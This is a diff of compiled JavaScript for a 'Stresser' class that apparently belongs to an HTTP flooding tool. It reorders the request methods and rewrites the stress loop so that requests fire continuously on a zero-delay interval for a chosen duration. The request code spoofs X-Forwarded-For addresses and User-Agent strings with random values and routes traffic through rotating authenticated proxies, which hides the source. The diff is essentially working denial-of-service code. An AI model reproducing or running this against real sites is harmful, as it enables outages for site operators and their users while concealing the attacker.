@@ -44,67 +44,6 @@ export class Stresser {
      * Send a request to the target URL
      * @param proxy The proxy to use for the request
      */
-    makeRequest_Beta(proxy) {
-        return new Promise((resolve, reject) => {
-            var _a;
-            try {
-                if (this.stats.pending >= this.options.maxPending)
-                    resolve(null);
-                this.requestSent();
-                // create headers
-                let headers = {
-                    'X-Forwarded-For': faker.internet.ipv4(),
-                    'User-Agent': faker.internet.userAgent(),
-                    'Accept': '*/*',
-                    'Accept-Language': 'en-US,en;q=0.5',
-                    'Accept-Encoding': 'gzip, deflate, br',
-                    'Referer': this.targetURL.hostname
-                };
-                // create options
-                let options = {
-                    method: 'GET',
-                    hostname: this.targetURL.hostname,
-                    port: this.targetURL.port,
-                    path: this.targetURL.pathname + this.targetURL.search,
-                    headers: headers,
-                    agent: this.httpAgent,
-                    timeout: 5000,
-                    // ==========================================
-                };
-                // handle use of proxy
-                if (this.options.useProxies) {
-                    if (!proxy)
-                        proxy = this.nextProxy;
-                    // transfer target host to headers for proxy
-                    headers['Host'] = `${options.hostname}:${options.port}`;
-                    // use proxy for target host
-                    options.hostname = proxy[0];
-                    options.port = Number(proxy[1]);
-                    // add proxy auth
-                    if (proxy.length === 4) {
-                        let auth = Buffer.from(`${proxy[2]}:${proxy[3]}`).toString('base64');
-                        headers['Proxy-Authorization'] = `Basic ${auth}`;
-                    }
-                }
-                const request = http.request(options, (response) => {
-                    response.on('data', (chunk) => { });
-                    response.once('end', () => resolve(this.requestCompleted(response.statusCode)));
-                });
-                request.once('error', () => resolve(this.requestError()));
-                // request.once('timeout', () => resolve(this.requestCompleted(false)));
-                request.end();
-                // if (!this.options.tracking) request.destroy();
-            }
-            catch (error) {
-                (_a = process.send) === null || _a === void 0 ? void 0 : _a.call(process, Packet(PacketType.Error, error));
-                resolve(this.requestError());
-            }
-        });
-    }
-    /**
-     * Send a request to the target URL
-     * @param proxy The proxy to use for the request
-     */
     makeRequest(proxy) {
         return __awaiter(this, void 0, void 0, function* () {
             if (this.stats.pending >= this.options.maxPending)
@@ -163,6 +102,67 @@ export class Stresser {
         });
     }
     /**
+     * Send a request to the target URL
+     * @param proxy The proxy to use for the request
+     */
+    makeRequest_Beta(proxy) {
+        return new Promise((resolve, reject) => {
+            var _a;
+            try {
+                if (this.stats.pending >= this.options.maxPending)
+                    resolve(null);
+                this.requestSent();
+                // create headers
+                let headers = {
+                    'X-Forwarded-For': faker.internet.ipv4(),
+                    'User-Agent': faker.internet.userAgent(),
+                    'Accept': '*/*',
+                    'Accept-Language': 'en-US,en;q=0.5',
+                    'Accept-Encoding': 'gzip, deflate, br',
+                    'Referer': this.targetURL.hostname
+                };
+                // create options
+                let options = {
+                    method: 'GET',
+                    hostname: this.targetURL.hostname,
+                    port: this.targetURL.port,
+                    path: this.targetURL.pathname + this.targetURL.search,
+                    headers: headers,
+                    agent: this.httpAgent,
+                    timeout: 5000,
+                    // ==========================================
+                };
+                // handle use of proxy
+                if (this.options.useProxies) {
+                    if (!proxy)
+                        proxy = this.nextProxy;
+                    // transfer target host to headers for proxy
+                    headers['Host'] = `${options.hostname}:${options.port}`;
+                    // use proxy for target host
+                    options.hostname = proxy[0];
+                    options.port = Number(proxy[1]);
+                    // add proxy auth
+                    if (proxy.length === 4) {
+                        let auth = Buffer.from(`${proxy[2]}:${proxy[3]}`).toString('base64');
+                        headers['Proxy-Authorization'] = `Basic ${auth}`;
+                    }
+                }
+                const request = http.request(options, (response) => {
+                    response.on('data', (chunk) => { });
+                    response.once('end', () => resolve(this.requestCompleted(response.statusCode)));
+                });
+                request.once('error', () => resolve(this.requestError()));
+                // request.once('timeout', () => resolve(this.requestCompleted(false)));
+                request.end();
+                // if (!this.options.tracking) request.destroy();
+            }
+            catch (error) {
+                (_a = process.send) === null || _a === void 0 ? void 0 : _a.call(process, Packet(PacketType.Error, error));
+                resolve(this.requestError());
+            }
+        });
+    }
+    /**
      * Stress the target URL for a specified duration
      * @param duration The duration of the attack
      * @param config The configuration to use for the requests
@@ -170,15 +170,26 @@ export class Stresser {
     stress(duration) {
         return __awaiter(this, void 0, void 0, function* () {
             // send requests
-            this.tick_v1();
-            // this.tick_v2(Date.now() + duration * 1000);
+            const intervalId = setInterval(() => {
+                for (let i = 0; i < this.options.multiplier; i++)
+                    this.makeRequest();
+            }, 0);
+            // wait for the duration
+            yield new Promise(resolve => setTimeout(resolve, duration * 1000));
+            // stop sending requests
+            clearInterval(intervalId);
+            // wait for pending requests to complete
+            // await new Promise<void>(resolve => {
+            // 	const intervalId = setInterval(() => {
+            // 		if (this.stats.pending === 0) {
+            // 			clearInterval(intervalId);
+            // 			resolve();
+            // 		}
+            // 	}, 0);
+            // });
+            // send stats update
+            this.sendStatsUpdate();
         });
-    }
-    tick_v1() {
-        setInterval(() => {
-            for (let i = 0; i < this.options.multiplier; i++)
-                this.makeRequest();
-        }, 0);
     }
     tick_v2(stop, ticks = 0) {
         if (Date.now() >= stop)
